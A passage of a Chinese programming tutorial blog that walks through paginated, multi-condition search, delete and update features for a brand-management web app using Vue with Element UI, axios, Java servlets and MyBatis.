<h4 id="前端实现-3"><a href="#前端实现-3" class="headerlink" title="前端实现"></a>前端实现</h4><h5 id="分页工具条"><a href="#分页工具条" class="headerlink" title="分页工具条"></a>分页工具条</h5><p>放在表单下面</p>
<pre><code class="hljs html"><span class="hljs-comment">&lt;!--分页工具条--&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">el-pagination</span></span>
<span class="hljs-tag">        @<span class="hljs-attr">size-change</span>=<span class="hljs-string">&quot;handleSizeChange&quot;</span>   &lt;!<span class="hljs-attr">--设置每页显示条数--</span>&gt;</span>
        @current-change=&quot;handleCurrentChange&quot;  <span class="hljs-comment">&lt;!--修改当前页码--&gt;</span>
        :current-page=&quot;currentPage&quot;         <span class="hljs-comment">&lt;!--绑定currentPage模型--&gt;</span>
        :page-sizes=&quot;[5, 10, 15, 20]&quot;
        :page-size=&quot;5&quot;
        layout=&quot;total, sizes, prev, pager, next, jumper&quot;
        :total=&quot;totalCount&quot;&gt;				<span class="hljs-comment">&lt;!--绑定totalCount模型--&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">el-pagination</span>&gt;</span></code></pre>

<p>修改<code>handleSizeChange</code>和<code>handleCurrentChange</code></p>
<pre><code class="hljs js"><span class="hljs-title function_">handleSizeChange</span>(<span class="hljs-params">val</span>) &#123;
    <span class="hljs-comment">// console.log(`每页 $&#123;val&#125; 条`);</span>
    <span class="hljs-comment">// 设置每页显示条数</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">pageSize</span> = val;
    <span class="hljs-comment">// 重新查询</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">selectAll</span>();
    <span class="hljs-comment">// this.currentPage=1</span>
&#125;,
<span class="hljs-title function_">handleCurrentChange</span>(<span class="hljs-params">val</span>) &#123;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">currentPage</span> = val;
&#125;,</code></pre>

<h5 id="修改selectAll-异步请求方法"><a href="#修改selectAll-异步请求方法" class="headerlink" title="修改selectAll()异步请求方法"></a>修改selectAll()异步请求方法</h5><p>主要修改url和获取响应数据后的处理方式</p>
<pre><code class="hljs js"><span class="hljs-title function_">selectAll</span>(<span class="hljs-params"></span>)&#123;
                <span class="hljs-comment">// var _this = this;</span>
                <span class="hljs-comment">// axios(&#123;</span>
                <span class="hljs-comment">//     method: &#x27;GET&#x27;,</span>
                <span class="hljs-comment">//     url: &#x27;http://localhost:8080/brand-case/brand/selectAll&#x27;</span>
                <span class="hljs-comment">// &#125;).then(function(response)&#123;</span>
                <span class="hljs-comment">//     var brandlist = response.data;</span>
                <span class="hljs-comment">//     _this.brandlist = brandlist;</span>
                <span class="hljs-comment">// &#125;)</span>

                <span class="hljs-keyword">var</span> _this = <span class="hljs-variable language_">this</span>;
                <span class="hljs-title function_">axios</span>(&#123;
                    <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;GET&#x27;</span>,
                    <span class="hljs-attr">url</span>: <span class="hljs-string">&#x27;http://localhost:8080/brand-case/brand/selectByPage?currentpage=&#x27;</span>+ _this.<span class="hljs-property">currentPage</span> + <span class="hljs-string">&#x27;&amp;pagesize=&#x27;</span> + _this.<span class="hljs-property">pageSize</span>
                &#125;).<span class="hljs-title function_">then</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">response</span>)&#123;
                    <span class="hljs-comment">// 获取数据   &#123;rows: &#123; &#125;,totalCount:47&#125;</span>
                    <span class="hljs-keyword">var</span> brandlist = response.<span class="hljs-property">data</span>.<span class="hljs-property">rows</span>;
                    <span class="hljs-comment">// 设置表格数据</span>
                    _this.<span class="hljs-property">brandlist</span> = brandlist;
                    <span class="hljs-comment">// 设置总记录数</span>
                    _this.<span class="hljs-property">totalCount</span> = response.<span class="hljs-property">data</span>.<span class="hljs-property">totalCount</span>;
                &#125;)
            &#125;,</code></pre>

<h3 id="5-多条件分页查询"><a href="#5-多条件分页查询" class="headerlink" title="5.多条件分页查询"></a>5.多条件分页查询</h3><h4 id="需求分析-4"><a href="#需求分析-4" class="headerlink" title="需求分析"></a>需求分析</h4><ul>
<li>用户提交数据 状态 品牌名称 企业名称， 绑定到brand模型后作为参数提交为后端</li>
<li>三个条件的查询为and关系，并且对品牌和企业的查询需要使用模糊查询即需要like关键字</li>
<li>查询后依然需要分页显示，因此需要返回符合条件的数据外，还要返回对应的数量</li>
<li>可以根据分页查询修改代码</li>
</ul>
<h4 id="后端实现-4"><a href="#后端实现-4" class="headerlink" title="后端实现"></a>后端实现</h4><h5 id="dao-4"><a href="#dao-4" class="headerlink" title="dao"></a>dao</h5><p>需要两个查询，<code>selelctByConditions</code>和<code>selectByConditionsCount</code></p>
<pre><code class="hljs java"><span class="hljs-comment">/**</span>
<span class="hljs-comment"> * 多条件查询</span>
<span class="hljs-comment"> * <span class="hljs-doctag">@param</span> brand</span>
<span class="hljs-comment"> * <span class="hljs-doctag">@param</span> begin</span>
<span class="hljs-comment"> * <span class="hljs-doctag">@param</span> size</span>
<span class="hljs-comment"> * <span class="hljs-doctag">@return</span></span>
<span class="hljs-comment"> */</span>
List&lt;Brand&gt; <span class="hljs-title function_">selectByConditions</span><span class="hljs-params">(<span class="hljs-meta">@Param(&quot;brand&quot;)</span> Brand brand, <span class="hljs-meta">@Param(&quot;begin&quot;)</span> <span class="hljs-type">int</span> begin, <span class="hljs-meta">@Param(&quot;size&quot;)</span> <span class="hljs-type">int</span> size)</span>;

<span class="hljs-comment">/**</span>
<span class="hljs-comment"> * 多条件查询的记录条数</span>
<span class="hljs-comment"> * <span class="hljs-doctag">@param</span> brand</span>
<span class="hljs-comment"> * <span class="hljs-doctag">@return</span></span>
<span class="hljs-comment"> */</span>
<span class="hljs-type">int</span> <span class="hljs-title function_">selectByConditionsCount</span><span class="hljs-params">(Brand brand)</span>;
</code></pre>

<p>在对应的<code>BrandMapper.xml</code>中实现具体的查询</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;selectByConditions&quot;</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">&quot;com.itheima.pojo.Brand&quot;</span> <span class="hljs-attr">resultMap</span>=<span class="hljs-string">&quot;brandResultMap&quot;</span>&gt;</span>
    select * from tb_brand
    <span class="hljs-tag">&lt;<span class="hljs-name">where</span>&gt;</span>
        <span class="hljs-comment">&lt;!--这里有多个参数，访问brand数据实时需要使用brand.brandName--&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;brand.brandName != null and brand.brandName != &#x27;&#x27;&quot;</span>&gt;</span>
            and brand_name like #&#123;brand.brandName&#125;
        <span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;brand.companyName != null and brand.companyName != &#x27;&#x27;&quot;</span>&gt;</span>
            and company_name like #&#123;brand.companyName&#125;
        <span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;brand.status != null&quot;</span>&gt;</span>
            and status = #&#123;brand.status&#125;
        <span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">where</span>&gt;</span>
    limit #&#123;begin&#125;, #&#123;size&#125;
<span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;selectByConditionsCount&quot;</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">&quot;java.lang.Integer&quot;</span>&gt;</span>
    select count(*) from tb_brand
    <span class="hljs-tag">&lt;<span class="hljs-name">where</span>&gt;</span>
         <span class="hljs-comment">&lt;!--这里为单个参数，访问brand数据实时需要使用#&#123;brandName&#125;--&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;brandName != null and brandName != &#x27;&#x27;&quot;</span>&gt;</span>
            and brand_name like #&#123;brandName&#125;
        <span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;companyName != null and companyName != &#x27;&#x27;&quot;</span>&gt;</span>
            and company_name like #&#123;companyName&#125;
        <span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;status != null&quot;</span>&gt;</span>
            and status = #&#123;status&#125;
        <span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">where</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span></code></pre>

<h5 id="service-4"><a href="#service-4" class="headerlink" title="service"></a>service</h5><p>在<code>BrandService</code>中实现多条件分页查询的业务逻辑</p>
<pre><code class="hljs java"><span class="hljs-comment">/**</span>
<span class="hljs-comment">   * 多条件分页查询</span>
<span class="hljs-comment">   * <span class="hljs-doctag">@param</span> currentPage</span>
<span class="hljs-comment">   * <span class="hljs-doctag">@param</span> pageSize</span>
<span class="hljs-comment">   * <span class="hljs-doctag">@return</span></span>
<span class="hljs-comment">   */</span>
  <span class="hljs-keyword">public</span> PageBean&lt;Brand&gt; <span class="hljs-title function_">selectByConditionsPage</span><span class="hljs-params">(Brand brand, <span class="hljs-type">int</span> currentPage, <span class="hljs-type">int</span> pageSize)</span>&#123;
      <span class="hljs-type">SqlSession</span> <span class="hljs-variable">sqlSession</span> <span class="hljs-operator">=</span> sqlSessionFactory.openSession();
      <span class="hljs-type">BrandMapper</span> <span class="hljs-variable">mapper</span> <span class="hljs-operator">=</span> sqlSession.getMapper(BrandMapper.class);

      <span class="hljs-type">int</span> <span class="hljs-variable">begin</span> <span class="hljs-operator">=</span> (currentPage - <span class="hljs-number">1</span>) * pageSize;
      <span class="hljs-type">int</span> <span class="hljs-variable">size</span> <span class="hljs-operator">=</span> pageSize;


      <span class="hljs-comment">// 对数据进行处理加上 % 模糊查询表达式</span>
      <span class="hljs-keyword">if</span>(brand.getBrandName() != <span class="hljs-literal">null</span> &amp;&amp; brand.getBrandName().length() &gt; <span class="hljs-number">0</span> )&#123;
          brand.setBrandName(<span class="hljs-string">&quot;%&quot;</span> + brand.getBrandName() + <span class="hljs-string">&quot;%&quot;</span>);
      &#125;

      <span class="hljs-keyword">if</span>(brand.getCompanyName() != <span class="hljs-literal">null</span> &amp;&amp; brand.getCompanyName().length() &gt; <span class="hljs-number">0</span>)&#123;
          brand.setCompanyName(<span class="hljs-string">&quot;%&quot;</span> + brand.getCompanyName() + <span class="hljs-string">&quot;%&quot;</span>);
      &#125;
      System.out.println(brand);

      List&lt;Brand&gt; rows = mapper.selectByConditions(brand, begin, size);

      <span class="hljs-type">int</span> <span class="hljs-variable">totalCount</span> <span class="hljs-operator">=</span> mapper.selectByConditionsCount(brand);

      PageBean&lt;Brand&gt; pageBean = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PageBean</span>&lt;&gt;();
      pageBean.setRows(rows);
      pageBean.setTotalCount(totalCount);

      sqlSession.close();

      <span class="hljs-keyword">return</span> pageBean;

  &#125;</code></pre>

<h5 id="servlet-4"><a href="#servlet-4" class="headerlink" title="servlet"></a>servlet</h5><pre><code class="hljs java"><span class="hljs-comment">/**</span>
<span class="hljs-comment"> * 搜索</span>
<span class="hljs-comment"> * <span class="hljs-doctag">@param</span> request</span>
<span class="hljs-comment"> * <span class="hljs-doctag">@param</span> response</span>
<span class="hljs-comment"> * <span class="hljs-doctag">@throws</span> ServletException</span>
<span class="hljs-comment"> * <span class="hljs-doctag">@throws</span> IOException</span>
<span class="hljs-comment"> */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">search</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;
    <span class="hljs-comment">// 1.获取当前页码和每页展示条数 url?currentpage=1&amp;pagesize=5</span>
    <span class="hljs-type">String</span> <span class="hljs-variable">_currentpage</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;currentpage&quot;</span>);
    <span class="hljs-type">String</span> <span class="hljs-variable">_pagesize</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;pagesize&quot;</span>);
    <span class="hljs-type">int</span> <span class="hljs-variable">currentpage</span> <span class="hljs-operator">=</span> Integer.parseInt(_currentpage);
    <span class="hljs-type">int</span> <span class="hljs-variable">pagesize</span> <span class="hljs-operator">=</span> Integer.parseInt(_pagesize);

    <span class="hljs-comment">// 2.获取json字符串</span>
    <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">reader</span> <span class="hljs-operator">=</span> request.getReader();
    <span class="hljs-type">String</span> <span class="hljs-variable">line</span> <span class="hljs-operator">=</span> reader.readLine();
    System.out.println(line);
    <span class="hljs-comment">// 3.将json字符串转为brand对象</span>
    <span class="hljs-type">Brand</span> <span class="hljs-variable">brand</span> <span class="hljs-operator">=</span> JSON.parseObject(line, Brand.class);

    System.out.println(brand);
    <span class="hljs-comment">// 4.调用service方法 获取pageBean对象</span>
    PageBean&lt;Brand&gt; pageBean = service.selectByConditionsPage(brand, currentpage, pagesize);


    <span class="hljs-comment">// 5.将PageBean转为Json字符串</span>
    <span class="hljs-type">String</span> <span class="hljs-variable">string</span> <span class="hljs-operator">=</span> JSON.toJSONString(pageBean);
    <span class="hljs-comment">// 6.发送响应数据</span>
    response.setContentType(<span class="hljs-string">&quot;text/json;charset=utf-8&quot;</span>);
    response.getWriter().write(string);
&#125;</code></pre>

<h4 id="前端实现-4"><a href="#前端实现-4" class="headerlink" title="前端实现"></a>前端实现</h4><h5 id="获取查询条件"><a href="#获取查询条件" class="headerlink" title="获取查询条件"></a>获取查询条件</h5><p>查询表单绑定的模型为<code>searchBrand</code></p>
<pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">el-form</span> <span class="hljs-attr">:inline</span>=<span class="hljs-string">&quot;true&quot;</span> <span class="hljs-attr">:model</span>=<span class="hljs-string">&quot;searchBrand&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;demo-form-inline&quot;</span>&gt;</span></code></pre>

<p><code>searchBrand</code>数据如下</p>
<pre><code class="hljs js"><span class="hljs-comment">// 搜索数据</span>
             <span class="hljs-attr">searchBrand</span>:&#123;
                 <span class="hljs-attr">status</span>: <span class="hljs-string">&#x27;&#x27;</span>,
                 <span class="hljs-attr">brandName</span>: <span class="hljs-string">&#x27;&#x27;</span>,
                 <span class="hljs-attr">companyName</span>: <span class="hljs-string">&#x27;&#x27;</span>,
                 <span class="hljs-attr">id</span>:<span class="hljs-string">&quot;&quot;</span>,
                 <span class="hljs-attr">ordered</span>:<span class="hljs-string">&quot;&quot;</span>,
                 <span class="hljs-attr">description</span>:<span class="hljs-string">&quot;&quot;</span>
             &#125;,</code></pre>

<p>当用户输入条件后，数据自动绑定到<code>searchBrand</code>模型上，向后台提交数据时，提交<code>searchBrand</code>即可</p>
<h5 id="查询的异步请求"><a href="#查询的异步请求" class="headerlink" title="查询的异步请求"></a>查询的异步请求</h5><pre><code class="hljs js"><span class="hljs-title function_">search</span>(<span class="hljs-params"></span>)&#123;
           <span class="hljs-keyword">var</span> _this = <span class="hljs-variable language_">this</span>;

           <span class="hljs-title function_">axios</span>(&#123;
               <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,
               <span class="hljs-attr">url</span>: <span class="hljs-string">&#x27;http://localhost:8080/brand-case/brand/search?currentpage=&#x27;</span>+ _this.<span class="hljs-property">currentPage</span> + <span class="hljs-string">&#x27;&amp;pagesize=&#x27;</span> + _this.<span class="hljs-property">pageSize</span>,
               <span class="hljs-attr">data</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">searchBrand</span>
           &#125;).<span class="hljs-title function_">then</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">response</span>)&#123;
                   <span class="hljs-comment">// 获取数据   &#123;rows: &#123; &#125; &#125;</span>
                   <span class="hljs-comment">// 设置表格数据</span>
                   _this.<span class="hljs-property">brandlist</span> = response.<span class="hljs-property">data</span>.<span class="hljs-property">rows</span>;
                   <span class="hljs-comment">// 设置总记录数</span>
                   _this.<span class="hljs-property">totalCount</span> = response.<span class="hljs-property">data</span>.<span class="hljs-property">totalCount</span>;
                   _this.<span class="hljs-property">currentPage</span> = <span class="hljs-number">1</span>;
           &#125;)
       &#125;</code></pre>



<h3 id="6-删除单条数据"><a href="#6-删除单条数据" class="headerlink" title="6.删除单条数据"></a>6.删除单条数据</h3><h4 id="需求分析-5"><a href="#需求分析-5" class="headerlink" title="需求分析"></a>需求分析</h4><ul>
<li>删除单条数据时需要携带该数据的id，使用get请求既可</li>
<li>获取id，可以使用<code>scope.row.id</code></li>
</ul>
<h4 id="后端实现-5"><a href="#后端实现-5" class="headerlink" title="后端实现"></a>后端实现</h4><h5 id="dao-5"><a href="#dao-5" class="headerlink" title="dao"></a>dao</h5><pre><code class="hljs java"><span class="hljs-comment">/**</span>
<span class="hljs-comment"> * 删除指定商品</span>
<span class="hljs-comment"> * <span class="hljs-doctag">@param</span> id</span>
<span class="hljs-comment"> */</span>
<span class="hljs-meta">@Delete(&quot;delete from tb_brand where id = #&#123;id&#125;&quot;)</span>
<span class="hljs-keyword">void</span> <span class="hljs-title function_">deleteById</span><span class="hljs-params">(<span class="hljs-meta">@Param(&quot;id&quot;)</span> <span class="hljs-type">int</span> id)</span>;</code></pre>

<h5 id="service-5"><a href="#service-5" class="headerlink" title="service"></a>service</h5><pre><code class="hljs java"><span class="hljs-comment">/**</span>
<span class="hljs-comment"> * 删除指定数据</span>
<span class="hljs-comment"> * <span class="hljs-doctag">@param</span> id</span>
<span class="hljs-comment"> */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deleteById</span><span class="hljs-params">(<span class="hljs-type">int</span> id)</span>&#123;
    <span class="hljs-type">SqlSession</span> <span class="hljs-variable">sqlSession</span> <span class="hljs-operator">=</span> sqlSessionFactory.openSession();
    <span class="hljs-type">BrandMapper</span> <span class="hljs-variable">mapper</span> <span class="hljs-operator">=</span> sqlSession.getMapper(BrandMapper.class);

    mapper.deleteById(id);
    sqlSession.commit();
    sqlSession.close();
&#125;</code></pre>

<h5 id="servlet-5"><a href="#servlet-5" class="headerlink" title="servlet"></a>servlet</h5><pre><code class="hljs java"><span class="hljs-comment">/**</span>
<span class="hljs-comment"> * 删除指定数据</span>
<span class="hljs-comment"> * <span class="hljs-doctag">@param</span> request</span>
<span class="hljs-comment"> * <span class="hljs-doctag">@param</span> response</span>
<span class="hljs-comment"> * <span class="hljs-doctag">@throws</span> ServletException</span>
<span class="hljs-comment"> * <span class="hljs-doctag">@throws</span> IOException</span>
<span class="hljs-comment"> */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deleteById</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;

    <span class="hljs-type">String</span> <span class="hljs-variable">_id</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;id&quot;</span>);
    <span class="hljs-type">int</span> <span class="hljs-variable">id</span> <span class="hljs-operator">=</span> Integer.parseInt(_id);
    service.deleteById(id);
    response.getWriter().write(<span class="hljs-string">&quot;success&quot;</span>);

&#125;</code></pre>

<h4 id="前端实现-5"><a href="#前端实现-5" class="headerlink" title="前端实现"></a>前端实现</h4><h5 id="获取id"><a href="#获取id" class="headerlink" title="获取id"></a>获取id</h5><p><a href="https://blog.csdn.net/tg928600774/article/details/81945140">参考</a></p>
<p>在修改和删除按钮位置添加<code> slot-scope=&quot;scope&quot;</code></p>
<pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">el-row</span> <span class="hljs-attr">slot-scope</span>=<span class="hljs-string">&quot;scope&quot;</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">el-button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;primary&quot;</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;update(scope.row)&quot;</span> &gt;</span>修改<span class="hljs-tag">&lt;/<span class="hljs-name">el-button</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">el-button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;danger&quot;</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;deleteById(scope.row.id)&quot;</span> &gt;</span>删除<span class="hljs-tag">&lt;/<span class="hljs-name">el-button</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">el-row</span>&gt;</span></code></pre>

<p>使用<code>scope.row.id</code>即可获取到每行数据的id</p>
<h5 id="异步请求"><a href="#异步请求" class="headerlink" title="异步请求"></a>异步请求</h5><p>同样使用confirm组件提示用户是否真的想删除</p>
<pre><code class="hljs js"><span class="hljs-title function_">deleteById</span>(<span class="hljs-params">id</span>)&#123;
             <span class="hljs-variable language_">this</span>.$confirm(<span class="hljs-string">&#x27;确定删除吗？&#x27;</span>, <span class="hljs-string">&#x27;确认信息&#x27;</span>, &#123;
                 <span class="hljs-attr">distinguishCancelAndClose</span>: <span class="hljs-literal">true</span>,
                 <span class="hljs-attr">confirmButtonText</span>: <span class="hljs-string">&#x27;确定&#x27;</span>,
                 <span class="hljs-attr">cancelButtonText</span>: <span class="hljs-string">&#x27;取消&#x27;</span>
             &#125;).<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> &#123;
                 <span class="hljs-variable language_">this</span>.<span class="hljs-property">currentPage</span>=<span class="hljs-number">1</span>
                 <span class="hljs-keyword">var</span> _this = <span class="hljs-variable language_">this</span>;
                 <span class="hljs-keyword">var</span> deleteId = id;
                 <span class="hljs-title function_">axios</span>(&#123;
                     <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;get&#x27;</span>,
                     <span class="hljs-attr">url</span>: <span class="hljs-string">&#x27;http://localhost:8080/brand-case/brand/deleteById?id=&#x27;</span>+deleteId,
                 &#125;).<span class="hljs-title function_">then</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">response</span>)&#123;
                     <span class="hljs-keyword">if</span>(response.<span class="hljs-property">data</span> == <span class="hljs-string">&quot;success&quot;</span>)&#123;
                         <span class="hljs-comment">// 重新查询数据</span>
                         _this.<span class="hljs-title function_">selectAll</span>();
                         <span class="hljs-comment">//显示提示框</span>
                         _this.$message(&#123;
                             <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;success&#x27;</span>,
                             <span class="hljs-attr">message</span>: <span class="hljs-string">&#x27;删除成功&#x27;</span>
                         &#125;);
                     &#125;
                 &#125;)
             &#125;).<span class="hljs-title function_">catch</span>(<span class="hljs-function">() =&gt;</span> &#123;
                 <span class="hljs-variable language_">this</span>.$message(&#123;
                     <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;info&#x27;</span>,
                     <span class="hljs-attr">message</span>: <span class="hljs-string">&quot;取消删除&quot;</span>
                 &#125;)
             &#125;)
         &#125;,</code></pre>

<h3 id="7-修改"><a href="#7-修改" class="headerlink" title="7.修改"></a>7.修改</h3><h4 id="需求分析-6"><a href="#需求分析-6" class="headerlink" title="需求分析"></a>需求分析</h4><ul>
<li>修改与添加类似，需要弹出对话框后进行数据的编辑</li>
<li>如何获取每行的数据，使用<code>scope.row</code>即可</li>
<li>请求数据为json数据，后台接收后将其转换为Brand类型后进行更新操作</li>
</ul>
<h4 id="后端实现-6"><a href="#后端实现-6" class="headerlink" title="后端实现"></a>后端实现</h4><h5 id="dao-6"><a href="#dao-6" class="headerlink" title="dao"></a>dao</h5><pre><code class="hljs java"><span class="hljs-comment">/**</span>
<span class="hljs-comment"> * 更新数据</span>
<span class="hljs-comment"> * <span class="hljs-doctag">@param</span> brand</span>
<span class="hljs-comment"> */</span>
<span class="hljs-meta">@Update(&quot;update tb_brand set brand_name = #&#123;brandName&#125;,company_name = #&#123;companyName&#125;,ordered = #&#123;ordered&#125;,description = #&#123;description&#125;,status = #&#123;status&#125; where id = #&#123;id&#125;&quot;)</span>
<span class="hljs-meta">@ResultMap(&quot;brandResultMap&quot;)</span>
<span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">(Brand brand)</span>;</code></pre>

<h5 id="service-6"><a href="#service-6" class="headerlink" title="service"></a>service</h5><pre><code class="hljs java"><span class="hljs-comment">/**</span>
<span class="hljs-comment"> * 更新数据</span>
<span class="hljs-comment"> * <span class="hljs-doctag">@param</span> brand</span>
<span class="hljs-comment"> */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">(Brand brand)</span>&#123;
    <span class="hljs-type">SqlSession</span> <span class="hljs-variable">sqlSession</span> <span class="hljs-operator">=</span> sqlSessionFactory.openSession();
    <span class="hljs-type">BrandMapper</span> <span class="hljs-variable">mapper</span> <span class="hljs-operator">=</span> sqlSession.getMapper(BrandMapper.class);

    mapper.update(brand);
    sqlSession.commit();
    sqlSession.close();
&#125;</code></pre>

<h5 id="servlet-6"><a href="#servlet-6" class="headerlink" title="servlet"></a>servlet</h5><pre><code class="hljs java"><span class="hljs-comment">/**</span>
<span class="hljs-comment"> * 更新</span>
<span class="hljs-comment"> * <span class="hljs-doctag">@param</span> request</span>
<span class="hljs-comment"> * <span class="hljs-doctag">@param</span> response</span>
<span class="hljs-comment"> * <span class="hljs-doctag">@throws</span> ServletException</span>
<span class="hljs-comment"> * <span class="hljs-doctag">@throws</span> IOException</span>
<span class="hljs-comment"> */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;


    <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">reader</span> <span class="hljs-operator">=</span> request.getReader();
    <span class="hljs-type">String</span> <span class="hljs-variable">line</span> <span class="hljs-operator">=</span> reader.readLine();
    System.out.println(line);
    <span class="hljs-type">Brand</span> <span class="hljs-variable">brand</span> <span class="hljs-operator">=</span> JSON.parseObject(line, Brand.class);
    System.out.println(brand);
    service.update(brand);

    response.getWriter().write(<span class="hljs-string">&quot;success&quot;</span>);
&#125;</code></pre>

<h4 id="前端实现-6"><a href="#前端实现-6" class="headerlink" title="前端实现"></a>前端实现</h4><h5 id="修改对话框"><a href="#修改对话框" class="headerlink" title="修改对话框"></a>修改对话框</h5><p>该对话框与增加对话的实现相同，不过该对话框初始时需要显示数据</p>
<pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">el-button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;primary&quot;</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;update(scope.row)&quot;</span> &gt;</span>修改<span class="hljs-tag">&lt;/<span class="hljs-name">el-button</span>&gt;</span></code></pre>

<p>update函数的实现</p>
<pre><code class="hljs js"><span class="hljs-title function_">update</span>(<span class="hljs-params">data</span>)&#123;
              <span class="hljs-keyword">var</span> _this = <span class="hljs-variable language_">this</span>;
              <span class="hljs-variable language_">this</span>.<span class="hljs-property">dialogUpdateVisible</span> = <span class="hljs-literal">true</span>;
              <span class="hljs-variable language_">this</span>.<span class="hljs-property">updateBrand</span>.<span class="hljs-property">brandName</span> = data.<span class="hljs-property">brandName</span>;
              <span class="hljs-variable language_">this</span>.<span class="hljs-property">updateBrand</span>.<span class="hljs-property">companyName</span> = data.<span class="hljs-property">companyName</span>;
              <span class="hljs-variable language_">this</span>.<span class="hljs-property">updateBrand</span>.<span class="hljs-property">status</span> = data.<span class="hljs-property">status</span>;
              <span class="hljs-variable language_">this</span>.<span class="hljs-property">updateBrand</span>.<span class="hljs-property">ordered</span> = data.<span class="hljs-property">ordered</span>;
              <span class="hljs-variable language_">this</span>.<span class="hljs-property">updateBrand</span>.<span class="hljs-property">description</span> = data.<span class="hljs-property">description</span>;
              <span class="hljs-variable language_">this</span>.<span class="hljs-property">updateBrand</span>.<span class="hljs-property">statusStr</span> = data.<span class="hljs-property">statusStr</span>;
          &#125;,</code></pre>

<p>updateBrand定义</p>
<pre><code class="hljs java">data() &#123;
           <span class="hljs-keyword">return</span> &#123;
               <span class="hljs-comment">//带修改的数据</span>
               updateBrand:&#123;
                   <span class="hljs-string">&quot;brandName&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,
                   <span class="hljs-string">&quot;companyName&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,
                   <span class="hljs-string">&quot;description&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,
                   <span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-number">1</span>,
                   <span class="hljs-string">&quot;ordered&quot;</span>: <span class="hljs-number">0</span>,
                   <span class="hljs-string">&quot;status&quot;</span>: <span class="hljs-number">0</span>,
                   <span class="hljs-string">&quot;statusStr&quot;</span>: <span class="hljs-string">&quot;&quot;</span>
               &#125;,
   &#125;</code></pre>

<h5 id="异步请求实现"><a href="#异步请求实现" class="headerlink" title="异步请求实现"></a>异步请求实现</h5><p>修改对话框的提交按钮位置</p>
<pre><code class="hljs html">
